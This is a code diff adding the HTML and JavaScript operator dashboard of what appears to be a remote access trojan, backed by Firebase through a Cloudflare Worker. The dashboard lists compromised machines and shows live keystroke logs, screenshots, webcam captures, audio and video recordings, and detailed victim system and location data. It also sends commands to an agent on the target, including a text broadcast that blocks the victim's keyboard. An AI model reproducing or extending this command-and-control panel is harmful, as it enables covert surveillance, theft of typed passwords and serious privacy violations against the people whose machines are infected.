+                <div style="margin-bottom:20px;">
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+                        <span><i class="fas fa-camera"></i> SCREENSHOT</span>
+                        <span id="screenshotCount" style="font-size:0.75rem;color:#888;">0 captures</span>
+                    </div>
+                    <div class="media-preview" id="screenshotContainer" onclick="openGallery('screenshot')">
+                        <div style="padding:20px;text-align:center;color:#666;">
+                            <i class="fas fa-camera" style="font-size:2rem;"></i><p>No screenshot yet</p>
+                        </div>
+                    </div>
+                    <div class="media-actions" id="screenshotActions" style="display:none;">
+                        <button class="media-btn" onclick="downloadCurrentCapture('screenshot')"><i class="fas fa-download"></i> Download</button>
+                        <button class="media-btn danger" onclick="deleteCurrentCapture('screenshot')"><i class="fas fa-trash"></i> Delete</button>
+                    </div>
+                </div>
+                <!-- Webcam -->
+                <div>
+                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:5px;">
+                        <span><i class="fas fa-video"></i> WEBCAM</span>
+                        <span id="webcamCount" style="font-size:0.75rem;color:#888;">0 captures</span>
+                    </div>
+                    <div class="media-preview" id="webcamContainer" onclick="openGallery('webcam')">
+                        <div style="padding:20px;text-align:center;color:#666;">
+                            <i class="fas fa-video" style="font-size:2rem;"></i><p>No webcam capture yet</p>
+                        </div>
+                    </div>
+                    <div class="media-actions" id="webcamActions" style="display:none;">
+                        <button class="media-btn" onclick="downloadCurrentCapture('webcam')"><i class="fas fa-download"></i> Download</button>
+                        <button class="media-btn danger" onclick="deleteCurrentCapture('webcam')"><i class="fas fa-trash"></i> Delete</button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Command History -->
+            <div class="panel-section">
+                <div class="panel-title"><i class="fas fa-history"></i> COMMAND HISTORY</div>
+                <div class="command-history" id="commandHistory">
+                    <p style="color:#666;">No commands yet</p>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Media Overlay — Gallery / Info / Video -->
+<div class="media-overlay" id="mediaOverlay">
+    <div class="overlay-back" id="overlayBack" onclick="overlayGoBack()" style="display:none;">
+        <i class="fas fa-arrow-left"></i> BACK
+    </div>
+    <!-- Top-right action buttons -->
+    <div id="overlayActions" style="position:absolute;top:15px;right:70px;display:none;align-items:center;gap:10px;z-index:1001;">
+        <button id="overlayDownloadBtn" onclick="overlayDownload()"
+            style="background:rgba(0,204,255,0.15);border:2px solid #00ccff;color:#00ccff;padding:8px 16px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:0.85rem;border-radius:5px;transition:all 0.3s;"
+            onmouseover="this.style.background='#00ccff';this.style.color='#000'"
+            onmouseout="this.style.background='rgba(0,204,255,0.15)';this.style.color='#00ccff'">
+            ⬇ DOWNLOAD
+        </button>
+        <button id="overlayDeleteBtn" onclick="overlayDelete()"
+            style="background:rgba(255,0,85,0.15);border:2px solid #ff0055;color:#ff0055;padding:8px 16px;cursor:pointer;font-family:'Share Tech Mono',monospace;font-size:0.85rem;border-radius:5px;transition:all 0.3s;"
+            onmouseover="this.style.background='#ff0055';this.style.color='#fff'"
+            onmouseout="this.style.background='rgba(255,0,85,0.15)';this.style.color='#ff0055'">
+            🗑 DELETE
+        </button>
+    </div>
+    <img src="" alt="Media" class="media-full" id="fullImage" style="display:none;">
+    <video class="video-full" id="fullVideo" controls style="display:none;"></video>
+    <div class="info-full" id="fullInfo" style="display:none;"></div>
+    <div class="overlay-nav left" id="navLeft" onclick="galleryNav(-1)" style="display:none;"><i class="fas fa-chevron-left"></i></div>
+    <div class="overlay-nav right" id="navRight" onclick="galleryNav(1)" style="display:none;"><i class="fas fa-chevron-right"></i></div>
+    <div class="gallery-counter" id="galleryCounter" style="display:none;"></div>
+    <div class="close-overlay" onclick="closeMediaOverlay()">&times;</div>
+</div>
+
+<script>
+// ===== AUTH =====
+async function checkPassword() {
+    const inp = document.getElementById('lockInput');
+    const errEl = document.getElementById('lockError');
+    if (!inp.value.trim()) return;
+    errEl.style.display = 'none';
+    inp.disabled = true;
+    try {
+        const res = await fetch(`${WORKER_URL}/auth/login`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ password: inp.value })
+        });
+        const data = await res.json();
+        if (res.ok && data.token) {
+            _token = data.token;
+            sessionStorage.setItem('_gst', data.token);
+            const ls = document.getElementById('lockScreen');
+            ls.style.transition = 'opacity 0.5s';
+            ls.style.opacity = '0';
+            setTimeout(() => { ls.style.display = 'none'; }, 500);
+            initApp();
+        } else {
+            errEl.style.display = 'block';
+            errEl.textContent = '✗  ' + (data.error || 'ACCESS DENIED');
+            errEl.style.animation = 'none'; void errEl.offsetWidth;
+            errEl.style.animation = 'shakeError 0.3s ease';
+            inp.value = ''; inp.focus();
+        }
+    } catch(e) {
+        errEl.style.display = 'block';
+        errEl.textContent = '✗  CONNECTION FAILED — CHECK WORKER_URL';
+    } finally { inp.disabled = false; }
+}
+
+// ===== CONFIRM MODAL =====
+let pendingDangerCommand = null;
+function confirmDanger(command) {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    pendingDangerCommand = command;
+    document.getElementById('confirmCmdLabel').textContent = command.toUpperCase();
+    document.getElementById('confirmModal').classList.add('active');
+    document.getElementById('confirmYesBtn').onclick = function() {
+        const cmd = pendingDangerCommand;
+        closeConfirm();
+        sendQuickCommand(cmd);
+    };
+}
+function closeConfirm() {
+    document.getElementById('confirmModal').classList.remove('active');
+    pendingDangerCommand = null;
+}
+document.getElementById('confirmModal').addEventListener('click', function(e) {
+    if (e.target === this) closeConfirm();
+});
+
+// ═══════════════════════════════════════════════════
+//  WORKER URL — only config needed in this file
+//  paste your Cloudflare Worker URL after deploy
+// ═══════════════════════════════════════════════════
+const WORKER_URL = "enter your cloudflare worker url";
+
+let _token = null;   // session token after login
+let database = null; // Firebase DB — init after login
+
+// All writes/deletes via Worker — no Firebase keys in HTML
+async function ghostFetch(method, path, body = null) {
+    if (!_token) return null;
+    const opts = {
+        method,
+        headers: { 'Content-Type': 'application/json', 'X-Session-Token': _token }
+    };
+    if (body !== null && ['PUT','POST','PATCH'].includes(method))
+        opts.body = JSON.stringify(body);
+    try {
+        const res = await fetch(`${WORKER_URL}/db/${path}`, opts);
+        if (res.status === 401) { doLogout(); return null; }
+        if (method === 'DELETE') return null;
+        return await res.json();
+    } catch(e) { console.warn('[Worker]', e); return null; }
+}
+
+async function initApp() {
+    try {
+        const cfg = await fetch(`${WORKER_URL}/config`, {
+            headers: { 'X-Session-Token': _token }
+        }).then(r => r.json());
+        if (cfg && cfg.databaseURL) {
+            if (!firebase.apps.length) firebase.initializeApp(cfg);
+            database = firebase.database();
+        }
+    } catch(e) { console.warn('Config fetch failed:', e); }
+    loadDevices();
+    loadTerminalHistory();
+    loadCommandHistory();
+    setupHeartbeatListener();
+}
+
+function doLogout() {
+    _token = null;
+    sessionStorage.removeItem('_gst');
+    location.reload();
+}
+
+// ===== GLOBALS =====
+let selectedDevice = null;
+let devices = {};
+let terminalHistory = [];
+let commandHistory = [];
+
+// Capture galleries: { screenshot: [{id, data}], webcam: [{id, data}] }
+let captureGalleries = { screenshot: [], webcam: [] };
+let currentOverlayItemId = null;   // tracks which item is open in overlay
+let currentOverlayItemType = null; // 'screenshot','webcam','video','audio'
+let currentOverlayData = null;     // base64 data for download
+let galleryType = null;
+let galleryIndex = 0;
+
+let recordedAudios = [];
+let recordedVideos = [];
+
+let liveKeylogRef = null;
+let liveKeyBuffer = [];
+let liveKeylogEnabled = false;
+let currentInfoData = null;
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', () => {
+    const saved = sessionStorage.getItem('_gst');
+    if (saved) {
+        _token = saved;
+        fetch(`${WORKER_URL}/auth/verify`, { headers: { 'X-Session-Token': saved } })
+            .then(r => r.json())
+            .then(d => {
+                if (d.valid) {
+                    document.getElementById('lockScreen').style.display = 'none';
+                    initApp();
+                } else {
+                    _token = null;
+                    sessionStorage.removeItem('_gst');
+                }
+            })
+            .catch(() => { _token = null; sessionStorage.removeItem('_gst'); });
+    }
+});
+
+function setupHeartbeatListener() {
+    if (!database) return;
+    database.ref('heartbeat').on('value', (snapshot) => {
+        const heartbeats = snapshot.val() || {};
+        const now = Date.now();
+        Object.entries(devices).forEach(([deviceId, device]) => {
+            const hb = heartbeats[deviceId];
+            if (hb && hb.timestamp) {
+                const isOnline = (now - new Date(hb.timestamp).getTime()) < 30000;
+                if (device.info) device.info._online = isOnline;
+            }
+        });
+        updateDeviceGrid(devices);
+        updateOnlineCount();
+    });
+}
+
+function loadDevices() {
+    if (!database) return;
+    database.ref('pcs').on('value', (snapshot) => {
+        devices = snapshot.val() || {};
+        updateDeviceGrid(devices);
+        updateOnlineCount();
+        if (selectedDevice && !devices[selectedDevice]) {
+            selectedDevice = null;
+            document.getElementById('commandInput').disabled = true;
+            document.getElementById('sendCommand').disabled = true;
+            resetMediaPreviews();
+            updateSelectedDeviceInfo(null);
+        }
+    });
+}
+
+// ===== REALTIME LISTENERS =====
+function setupRealtimeListeners() {
+    if (!selectedDevice || !database) return;
+
+    // Results — only NEW results (skip already existing ones on init)
+    const processedResults = new Set();
+    const resultsRef = database.ref(`pcs/${selectedDevice}/results`);
+    resultsRef.once('value', snap => {
+        // Mark all existing keys as already processed
+        if (snap.val()) Object.keys(snap.val()).forEach(k => processedResults.add(k));
+        // Now listen for new ones only
+        resultsRef.on('child_added', (snapshot) => {
+            if (processedResults.has(snapshot.key)) return;
+            processedResults.add(snapshot.key);
+            const result = snapshot.val();
+            if (result) displayCommandResult(result.command, result.result, result.timestamp);
+        });
+    });
+
+    // Captures
+    database.ref(`pcs/${selectedDevice}/captures`).on('child_added', (snapshot) => {
+        const data = snapshot.val();
+        if (!data) return;
+        const id = snapshot.key;
+        if (data.type === 'screenshot' && data.image) {
+            addToGallery('screenshot', id, data);
+        } else if (data.type === 'webcam' && data.image) {
+            addToGallery('webcam', id, data);
+        } else if (data.type === 'audio' && data.audio) {
+            addAudioToList(id, data);
+        } else if (data.type === 'video' && data.video) {
+            addVideoToList(id, data);
+        }
+    });
+
+    // Remove when deleted
+    database.ref(`pcs/${selectedDevice}/captures`).on('child_removed', (snapshot) => {
+        const id = snapshot.key;
+        const data = snapshot.val();
+        if (data) {
+            if (data.type === 'screenshot') removeFromGallery('screenshot', id);
+            else if (data.type === 'webcam') removeFromGallery('webcam', id);
+            else if (data.type === 'audio') removeAudioFromList(id);
+            else if (data.type === 'video') removeVideoFromList(id);
+        }
+    });
+
+    setupLiveKeylogListener();
+    setupDisplayListener();
+    setupBroadcastListener();
+}
+
+// ===== DISPLAY LISTENER =====
+function setupDisplayListener() {
+    database.ref(`display/${selectedDevice}`).on('value', (snap) => {
+        const d = snap.val();
+        if (d && d.active && d.text) {
+            setDisplayStatus(true, d.text);
+        } else {
+            setDisplayStatus(false, '');
+        }
+    });
+}
+
+function setupBroadcastListener() {
+    database.ref(`broadcast/${selectedDevice}`).on('value', (snap) => {
+        const d = snap.val();
+        if (d && d.text) {
+            setDisplayStatus(true, d.text);
+        } else {
+            setDisplayStatus(false, '');
+        }
+    });
+}
+
+function setDisplayStatus(active, text) {
+    const badge = document.getElementById('displayStatusBadge');
+    const bar = document.getElementById('displayActiveBar');
+    const activeText = document.getElementById('displayActiveText');
+    if (active) {
+        badge.style.background = '#001a00';
+        badge.style.color = '#00ff41';
+        badge.style.borderColor = '#00ff41';
+        badge.textContent = '● ACTIVE';
+        bar.style.display = 'block';
+        activeText.textContent = text.substring(0, 80) + (text.length > 80 ? '...' : '');
+    } else {
+        badge.style.background = '#1a0000';
+        badge.style.color = '#ff0055';
+        badge.style.borderColor = '#ff0055';
+        badge.textContent = '● INACTIVE';
+        bar.style.display = 'none';
+        activeText.textContent = '';
+    }
+}
+
+// ===== BROADCAST =====
+function sendDisplayText() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    const text = document.getElementById('displayTextInput').value.trim();
+    if (!text) { alert('Please enter broadcast text'); return; }
+    // Write to both broadcast and display nodes for maximum compatibility
+    const payload = { text: text, timestamp: new Date().toISOString() };
+    ghostFetch('PUT', `broadcast/${selectedDevice}`, payload);
+    ghostFetch('PUT', `display/${selectedDevice}`, { text: text, active: true, timestamp: new Date().toISOString() });
+    setDisplayStatus(true, text);
+    addToTerminal('BROADCAST', 'Sent: ' + text.substring(0, 60), 'system');
+}
+
+function clearDisplayText() {
+    if (!selectedDevice) { alert('Please select a device first'); return; }
+    // Delete from both Firebase paths — Python will detect empty text and close display
+    ghostFetch('DELETE', `broadcast/${selectedDevice}`);
+    ghostFetch('DELETE', `display/${selectedDevice}`);
+    setDisplayStatus(false, '');
+    document.getElementById('displayTextInput').value = '';
+    addToTerminal('BROADCAST', 'Cleared — keyboard unblocked on target', 'system');
+}
+
+// ===== LIVE KEYLOG =====
+let _keylogStatsRef = null;
+
+function setupLiveKeylogListener() {
+    if (!selectedDevice || !database) return;
+
+    // Clean up previous listeners
+    if (liveKeylogRef) { liveKeylogRef.off(); liveKeylogRef = null; }
+    if (_keylogStatsRef) { _keylogStatsRef.off(); _keylogStatsRef = null; }
+
+    liveKeyBuffer = [];
+    clearKeylogDisplay();
+
+    // Stats listener
+    _keylogStatsRef = database.ref(`keylogs/${selectedDevice}/_stats`);
+    _keylogStatsRef.on('value', (snap) => {
+        const s = snap.val();
+        if (s) {
+            liveKeylogEnabled = s.enabled === true;
+            updateKeylogStatus(liveKeylogEnabled);
+            document.getElementById('keylogCount').textContent = s.total || liveKeyBuffer.length;
+        } else {
+            updateKeylogStatus(false);
+        }
+    });
+
+    // Key data listener — only new chunks
+    const seenChunks = new Set();
+    liveKeylogRef = database.ref(`keylogs/${selectedDevice}`);
+    liveKeylogRef.once('value', snap => {
+        // Mark existing chunks so we skip them on first load
+        if (snap.val()) {
+            Object.entries(snap.val()).forEach(([k, v]) => {
+                if (k !== '_stats' && v && v.keys) {
+                    // Load existing keys into buffer
+                    v.keys.forEach(key => {
+                        liveKeyBuffer.push({
+                            type: key.type,
+                            key: key.key,
+                            timestamp: key.ts || key.timestamp || '',
+                            window: key.win || key.window || 'Unknown'
+                        });
+                    });
+                    seenChunks.add(k);
+                }
+            });
+            if (liveKeyBuffer.length > 5000) liveKeyBuffer = liveKeyBuffer.slice(-5000);
+            renderLiveKeylogs();
+            document.getElementById('keylogCount').textContent = liveKeyBuffer.length;
+        }
+
+        // Now listen for NEW chunks only
+        liveKeylogRef.on('child_added', (snap) => {
+            if (snap.key === '_stats' || seenChunks.has(snap.key)) return;
+            seenChunks.add(snap.key);
+            const data = snap.val();
+            if (!data || !data.keys) return;
+            data.keys.forEach(k => {
+                liveKeyBuffer.push({
+                    type: k.type,
+                    key: k.key,
+                    timestamp: k.ts || k.timestamp || '',
+                    window: k.win || k.window || 'Unknown'
+                });
+            });
+            if (liveKeyBuffer.length > 5000) liveKeyBuffer = liveKeyBuffer.slice(-5000);
+            renderLiveKeylogs();
+            document.getElementById('keylogCount').textContent = liveKeyBuffer.length;
+        });
+    });
+}
+
+function renderLiveKeylogs() {
+    const container = document.getElementById('keylogContainer');
+    if (!liveKeyBuffer.length) {
+        container.innerHTML = '<p style="color:#666;text-align:center;">Waiting for keys...</p>';
+        return;
+    }
+    let html = '<div class="keylog-text">';
+    let currentWindow = '';
+    let lineBuffer = '';
+    liveKeyBuffer.forEach(entry => {
+        const time = entry.timestamp ? new Date(entry.timestamp).toLocaleTimeString() : '';
+        if (entry.window && entry.window !== currentWindow) {
+            if (lineBuffer) { html += `<div class="keylog-line">${escHtml(lineBuffer)}</div>`; lineBuffer = ''; }
+            html += `<div class="keylog-line"><span class="keylog-time">[${time}]</span> <span style="color:#ff00aa;">[▶ ${escHtml(entry.window)}]</span></div>`;
+            currentWindow = entry.window;
+        }
+        if (entry.key === '[ENTER]\n' || entry.key === '[ENTER]') {
+            if (lineBuffer) { html += `<div class="keylog-line">${escHtml(lineBuffer)}</div>`; lineBuffer = ''; }
+            html += `<div class="keylog-line"><span class="keylog-time">[${time}]</span> <span class="keylog-special">[ENTER]</span></div>`;
+        } else if (entry.key === ' ') {
+            lineBuffer += ' ';
+        } else if (entry.key === '[TAB]') {
+            lineBuffer += '    ';
+        } else if (entry.key === '[BACKSPACE]') {
+            lineBuffer = lineBuffer.slice(0, -1);
+        } else if (entry.type === 'char') {
+            lineBuffer += entry.key;
+        } else {
+            if (lineBuffer) { html += `<div class="keylog-line">${escHtml(lineBuffer)}</div>`; lineBuffer = ''; }
+            html += `<div class="keylog-line"><span class="keylog-time">[${time}]</span> <span class="keylog-special">${escHtml(entry.key)}</span></div>`;
+        }
+    });
+    if (lineBuffer) html += `<div class="keylog-line">${escHtml(lineBuffer)}</div>`;
+    html += '</div>';
+    container.innerHTML = html;
+    container.scrollTop = container.scrollHeight;
+}
+
+function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+function updateKeylogStatus(enabled) {
+    document.getElementById('keylogStatusLed').className = 'status-led' + (enabled ? ' active' : '');
+    document.getElementById('keylogStatusText').textContent = enabled ? 'Active' : 'Disabled';
+}
+
+function clearKeylogDisplay() {
+    document.getElementById('keylogContainer').innerHTML = '<p style="color:#666;text-align:center;">No key data yet</p>';
+    document.getElementById('keylogCount').textContent = '0';
+}
+
+function clearKeylogs() {
+    if (!selectedDevice) return;
+    ghostFetch('DELETE', `keylogs/${selectedDevice}`);
+    clearKeylogDisplay();
+    liveKeyBuffer = [];
+    updateKeylogStatus(false);
+    sendQuickCommand('/keylog clear');
+}
+
+// ===== GALLERY / CAPTURES =====
+function addToGallery(type, id, data) {
+    // Avoid duplicates
+    if (captureGalleries[type].find(c => c.id === id)) return;
+    captureGalleries[type].unshift({ id, data });
+    // Update preview with latest
+    updateMediaPreview(type, data.image, data.timestamp, data.size_kb);
+    const actionsEl = document.getElementById(`${type}Actions`);
+    if (actionsEl) actionsEl.style.display = 'flex';
+    const countEl = document.getElementById(`${type}Count`);
+    if (countEl) countEl.textContent = captureGalleries[type].length + ' captures';
+}
+
+function removeFromGallery(type, id) {
+    captureGalleries[type] = captureGalleries[type].filter(c => c.id !== id);
+    const countEl = document.getElementById(`${type}Count`);
+    if (countEl) countEl.textContent = captureGalleries[type].length + ' captures';
+    if (captureGalleries[type].length > 0) {
+        const latest = captureGalleries[type][0];
+        updateMediaPreview(type, latest.data.image, latest.data.timestamp, latest.data.size_kb);
+    } else {
+        resetSinglePreview(type);
+    }
+}
+
+function openGallery(type) {
+    if (captureGalleries[type].length === 0) return;
+    galleryType = type;
+    galleryIndex = 0;
+    showGalleryItem();
+}
+
+function showGalleryItem() {
+    const item = captureGalleries[galleryType][galleryIndex];
+    if (!item) return;
+    const overlay = document.getElementById('mediaOverlay');
+    document.getElementById('fullImage').style.display = 'block';
+    document.getElementById('fullVideo').style.display = 'none';
+    document.getElementById('fullInfo').style.display = 'none';
+    document.getElementById('fullImage').src = `data:image/jpeg;base64,${item.data.image}`;
+    document.getElementById('overlayBack').style.display = 'none';
+
+    // Track current item for delete/download
+    currentOverlayItemId = item.id;
+    currentOverlayItemType = galleryType;
+    currentOverlayData = item.data.image;
+    showOverlayActions('image');
+
+    const total = captureGalleries[galleryType].length;
+    const navLeft = document.getElementById('navLeft');
+    const navRight = document.getElementById('navRight');
+    const counter = document.getElementById('galleryCounter');
+    navLeft.style.display = total > 1 ? 'flex' : 'none';
+    navRight.style.display = total > 1 ? 'flex' : 'none';
+    counter.style.display = 'block';
+    counter.textContent = `${galleryIndex + 1} / ${total}`;
+    overlay.classList.add('active');
+}
+
+function galleryNav(dir) {
+    if (!galleryType) return;
+    const total = captureGalleries[galleryType].length;
+    galleryIndex = (galleryIndex + dir + total) % total;
+    showGalleryItem();
+}
+
+function downloadCurrentCapture(type) {
+    if (captureGalleries[type].length === 0) return;
+    const item = captureGalleries[type][galleryIndex] || captureGalleries[type][0];
+    const link = document.createElement('a');
+    link.href = `data:image/jpeg;base64,${item.data.image}`;
+    link.download = `${type}_${Date.now()}.jpg`;
+    link.click();
+}
+
+function deleteCurrentCapture(type) {
+    if (!confirm(`Delete this ${type} capture?`)) return;
+    const item = captureGalleries[type][galleryIndex] || captureGalleries[type][0];
+    if (!item) return;
+    // Delete from Firebase — Python will also remove from its memory
+    ghostFetch('DELETE', `pcs/${selectedDevice}/captures/${item.id}`);
+    sendQuickCommand(`/delete_capture ${item.id}`);
+}
+
+function updateMediaPreview(type, imageB64, timestamp, sizeKb) {
+    const container = document.getElementById(`${type}Container`);
+    const time = timestamp ? new Date(timestamp).toLocaleString() : new Date().toLocaleString();
+    container.innerHTML = `
+        <img src="data:image/jpeg;base64,${imageB64}" style="width:100%;cursor:pointer;">
+        <div class="media-info">
+            <span>${time}</span>
+            <span>${sizeKb || 0} KB</span>
+        </div>
+    `;
+}
+
+function resetSinglePreview(type) {
+    const container = document.getElementById(`${type}Container`);
+    const actions = document.getElementById(`${type}Actions`);
+    if (actions) actions.style.display = 'none';
+    container.innerHTML = `
+        <div style="padding:20px;text-align:center;color:#666;">
+            <i class="fas fa-${type === 'webcam' ? 'video' : 'camera'}" style="font-size:2rem;"></i>
+            <p>No ${type} capture yet</p>
+        </div>
+    `;
+}
+
+function resetMediaPreviews() {
+    captureGalleries = { screenshot: [], webcam: [] };
+    ['screenshot', 'webcam'].forEach(type => resetSinglePreview(type));
+    document.getElementById('screenshotCount').textContent = '0 captures';
+    document.getElementById('webcamCount').textContent = '0 captures';
+}
+
+// ===== FULL INFO OVERLAY =====
+function showInfoOverlay(info) {
+    currentInfoData = info;
+    const overlay = document.getElementById('mediaOverlay');
+    document.getElementById('fullImage').style.display = 'none';
+    document.getElementById('fullVideo').style.display = 'none';
+    document.getElementById('navLeft').style.display = 'none';
+    document.getElementById('navRight').style.display = 'none';
+    document.getElementById('galleryCounter').style.display = 'none';
+    document.getElementById('overlayBack').style.display = 'none';
+    const fullInfo = document.getElementById('fullInfo');
+    fullInfo.style.display = 'block';
+
+    let html = '<h2 style="color:#ff00aa;margin-bottom:20px;border-bottom:2px solid #00ff9d;padding-bottom:10px;">📋 FULL SYSTEM INFO</h2>';
+
+    // Helper to add section
+    const section = (title, items) => {
+        let s = `<div class="info-section"><div class="info-title">${title}</div><div class="info-grid">`;
+        items.forEach(([label, value]) => {
+            s += `<div class="info-item"><span class="info-label">${label}</span><span class="info-value">${value || 'N/A'}</span></div>`;
+        });
+        return s + '</div></div>';
+    };
+
+    try {
+        html += section('📌 BASIC', [
+            ['Hostname', info.basic.hostname], ['Username', info.basic.username],
+            ['OS', info.basic.os], ['OS Version', info.basic.os_version],
+            ['Architecture', info.basic.architecture], ['Processor', info.basic.processor]
+        ]);
+    } catch(e) {}
+
+    try {
+        html += section('📍 LOCATION & NETWORK', [
+            ['City', info.location.city], ['Country', info.location.country],
+            ['Region', info.location.region], ['ISP', info.location.isp],
+            ['Local IP', info.location.local_ip], ['Public IP', info.location.public_ip],
+            ['MAC Address', info.location.mac_address]
+        ]);
+    } catch(e) {}
+
+    try {
+        html += section('💻 HARDWARE - CPU', [
+            ['CPU Model', info.hardware.cpu.model], ['Cores', info.hardware.cpu.cores],
+            ['Threads', info.hardware.cpu.threads], ['Frequency', info.hardware.cpu.frequency_current],
+            ['Max Frequency', info.hardware.cpu.frequency_max]
+        ]);
+        html += section('🧠 RAM', [
+            ['Total', info.hardware.memory.total], ['Used', `${info.hardware.memory.used} (${info.hardware.memory.usage_percent})`],
+            ['Available', info.hardware.memory.available]
+        ]);
+        html += section('💾 DISK', [
+            ['Total', info.hardware.disk.total], ['Used', `${info.hardware.disk.used} (${info.hardware.disk.usage_percent})`],
+            ['Free', info.hardware.disk.free]
+        ]);
+    } catch(e) {}
+
+    try {
+        if (info.hardware.disk.partitions && info.hardware.disk.partitions.length) {
+            html += '<div class="info-section"><div class="info-title">💾 PARTITIONS</div><div class="info-grid">';
+            info.hardware.disk.partitions.forEach(p => {
+                html += `<div class="info-item"><span class="info-label">${p.device} (${p.mountpoint})</span><span class="info-value">${p.used} / ${p.total} (${p.percent})</span></div>`;
+            });
+            html += '</div></div>';
+        }
+    } catch(e) {}
+
+    try {
+        if (info.network.wifi_networks && info.network.wifi_networks.length) {
+            html += '<div class="info-section"><div class="info-title">📡 WIFI NETWORKS</div><div class="info-grid">';
+            info.network.wifi_networks.forEach((w, i) => {
+                html += `<div class="info-item"><span class="info-value">${i+1}. ${w}</span></div>`;
+            });
+            html += '</div></div>';
+        }
+    } catch(e) {}
+
+    try {
+        html += section('⏰ SYSTEM', [
+            ['Boot Time', info.system.boot_time],
+            info.system.battery !== 'No Battery' ? ['Battery', `${info.system.battery.percent} (Charging: ${info.system.battery.power_plugged})`] : ['Battery', 'No Battery']
+        ]);
+    } catch(e) {}
+
+    try {
+        if (info.system.top_processes && info.system.top_processes.length) {
+            html += '<div class="info-section"><div class="info-title">⚙️ TOP PROCESSES</div><div class="info-grid">';
+            info.system.top_processes.forEach(p => {
+                html += `<div class="info-item"><span class="info-label">${p.name} (PID: ${p.pid})</span><span class="info-value">CPU: ${p.cpu}, MEM: ${p.memory}</span></div>`;
+            });
+            html += '</div></div>';
+        }
+    } catch(e) {}
+
+    fullInfo.innerHTML = html;
+    document.getElementById('overlayActions').style.display = 'none';
+    overlay.classList.add('active');
+}
+
+// ===== OVERLAY BACK / CLOSE =====
+let overlayHistory = [];
+
+function overlayGoBack() {
+    if (overlayHistory.length > 0) {
+        const prev = overlayHistory.pop();
+        if (prev === 'gallery') showGalleryItem();
+    } else {
+        closeMediaOverlay();
+    }
+}
+
+function closeMediaOverlay() {
+    document.getElementById('mediaOverlay').classList.remove('active');
+    document.getElementById('fullInfo').innerHTML = '';
+    document.getElementById('fullImage').style.display = 'none';
+    document.getElementById('fullVideo').style.display = 'none';
+    document.getElementById('navLeft').style.display = 'none';
+    document.getElementById('navRight').style.display = 'none';
+    document.getElementById('galleryCounter').style.display = 'none';
+    document.getElementById('overlayBack').style.display = 'none';
+    document.getElementById('overlayActions').style.display = 'none';
+    // Stop video
+    const vid = document.getElementById('fullVideo');
+    vid.pause();
+    vid.src = '';
+    overlayHistory = [];
+    galleryType = null;
+    currentOverlayItemId = null;
+    currentOverlayItemType = null;
+    currentOverlayData = null;
+}
+
+// Show/hide overlay action buttons
+function showOverlayActions(mediaType) {
+    const actions = document.getElementById('overlayActions');
+    actions.style.display = 'flex';
+    // For info overlay, hide delete (can't delete info)
+    const delBtn = document.getElementById('overlayDeleteBtn');
+    const dlBtn = document.getElementById('overlayDownloadBtn');
+    if (mediaType === 'info') {
+        delBtn.style.display = 'none';
+        dlBtn.style.display = 'none';
+    } else {
+        delBtn.style.display = '';
+        dlBtn.style.display = '';
+    }
+}
+
+function overlayDownload() {
+    if (!currentOverlayItemId || !currentOverlayData) return;
+    const link = document.createElement('a');
+    if (currentOverlayItemType === 'video') {
+        link.href = `data:video/mp4;base64,${currentOverlayData}`;
+        link.download = `video_${currentOverlayItemId}.mp4`;
+    } else if (currentOverlayItemType === 'audio') {
+        link.href = `data:audio/wav;base64,${currentOverlayData}`;
+        link.download = `audio_${currentOverlayItemId}.wav`;
+    } else {
+        link.href = `data:image/jpeg;base64,${currentOverlayData}`;
+        link.download = `${currentOverlayItemType}_${currentOverlayItemId}.jpg`;
+    }
+    link.click();
+}
+
+function overlayDelete() {
+    if (!currentOverlayItemId) return;
+    const typeLabel = currentOverlayItemType || 'item';
+    if (!confirm(`Delete this ${typeLabel}? This cannot be undone.`)) return;
+    const id = currentOverlayItemId;
+    const type = currentOverlayItemType;
+
+    // Delete from Firebase immediately
+    if (selectedDevice) {
+        ghostFetch('DELETE', `pcs/${selectedDevice}/captures/${id}`);
+        // Also send delete command to Python agent
+        sendQuickCommand(`/delete_capture ${id}`);
+    }
+
+    // Remove from local gallery arrays
+    if (type === 'screenshot' || type === 'webcam') {
+        captureGalleries[type] = captureGalleries[type].filter(c => c.id !== id);
+        const countEl = document.getElementById(`${type}Count`);
+        if (countEl) countEl.textContent = captureGalleries[type].length + ' captures';
+        // Update preview
+        if (captureGalleries[type].length > 0) {
+            const latest = captureGalleries[type][0];
+            updateMediaPreview(type, latest.data.image, latest.data.timestamp, latest.data.size_kb);
+        } else {
+            resetSinglePreview(type);
+        }
+    } else if (type === 'video') {
+        recordedVideos = recordedVideos.filter(v => v.id !== id);
+        renderVideoList();
+    } else if (type === 'audio') {
+        if (window.recordedAudios) {
+            window.recordedAudios = window.recordedAudios.filter(a => a.id !== id);
+            if (typeof renderAudioList === 'function') renderAudioList();
+        }
+    }
+
+    closeMediaOverlay();
+}
+
+// ===== VIDEO =====
+function addVideoToList(id, data) {
+    if (recordedVideos.find(v => v.id === id)) return;
+    recordedVideos.push({ id, data });
+    renderVideoList();
+}
+
+function removeVideoFromList(id) {
+    recordedVideos = recordedVideos.filter(v => v.id !== id);
+    renderVideoList();
+}
+
+function renderVideoList() {
+    const container = document.getElementById('videosContainer');
+    if (recordedVideos.length === 0) {
+        container.innerHTML = '<p style="color:#666;text-align:center;">No video recordings</p>';
+        return;
+    }
+    let html = '';
+    recordedVideos.forEach(v => {
+        const time = v.data.timestamp ? new Date(v.data.timestamp).toLocaleString() : '';
+        html += `
+            <div class="video-item" id="vid-${v.id}">
+                <div class="audio-info">
+                    <span><i class="fas fa-clock"></i> ${v.data.duration || '?'}s</span>
+                    <span><i class="fas fa-database"></i> ${v.data.size_kb || 0} KB</span>
+                    <span><i class="fas fa-calendar"></i> ${time}</span>
+                </div>
+                <div class="audio-controls">
+                    <button class="video-thumb-btn" onclick="playVideoOverlay('${v.id}')"><i class="fas fa-play"></i> PLAY FULLSCREEN</button>
+                    <button class="audio-btn" onclick="downloadVideo('${v.id}')"><i class="fas fa-download"></i> DL</button>
